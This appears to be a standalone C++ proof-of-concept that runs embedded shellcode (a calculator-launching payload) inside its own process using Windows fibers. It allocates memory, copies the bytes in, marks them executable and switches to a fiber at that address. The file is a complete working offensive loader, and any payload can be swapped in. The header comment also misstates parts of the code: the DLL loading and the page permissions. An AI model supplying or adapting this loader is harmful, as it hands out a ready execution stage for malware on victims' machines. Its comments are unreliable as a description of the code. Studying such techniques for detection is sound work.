/*
This program executes shellcode in the current process using the following steps
	1. Convert the main thread into a fiber with the ConvertThreadToFiber function
	2. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
	3. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
	4. Change the memory page permissions to Execute/Read with VirtualProtect
	5. Call CreateFiber on shellcode address
	6. Call SwitchToFiber to start the fiber and execute the shellcode

NOTE: Currently this program will NOT exit even after the shellcode has been executed. You must force terminate this process

This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
Reference: https://ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
*/

#include <cstdio>
#include <Windows.h>

int main() {
	// Pop Calc Shellcode (x86 & x64)
	unsigned char shellcode[] = { 80,81,82,83,86,87,85,106,96,90,104,99,97,108,99,84,89,72,131,236,40,101,72,139,50,72,139,118,24,72,139,118,16,72,173,72,139,48,72,139,126,48,3,87,60,139,92,23,40,139,116,31,32,72,1,254,139,84,31,36,15,183,44,23,141,82,2,173,129,60,7,87,105,110,69,117,239,139,116,31,28,72,1,254,139,52,174,72,1,247,153,255,215,72,131,196,48,93,95,94,91,90,89,88,195 };

	DWORD old = PAGE_READWRITE;

	LPVOID main_fiber =  ConvertThreadToFiber(NULL);
	if (main_fiber == NULL) {
		puts("ConvertThreadToFiber failed");
		return -1;
	}

	LPVOID dest = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (dest == NULL) {
		puts("VirtualAlloc failed");
		return -1;
	}

	RtlCopyMemory(dest, shellcode, sizeof(shellcode));

	BOOL res = VirtualProtect(dest, sizeof(shellcode), PAGE_EXECUTE, &old);
	if (res == FALSE) {
		puts("VirtualProtect failed");
		return -1;
	}

	LPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)dest, 0);
	if (fiber == NULL) {
		puts("CreateFiber failed");
		return -1;
	}

	SwitchToFiber(fiber);
	SwitchToFiber(main_fiber);

	return 0;
}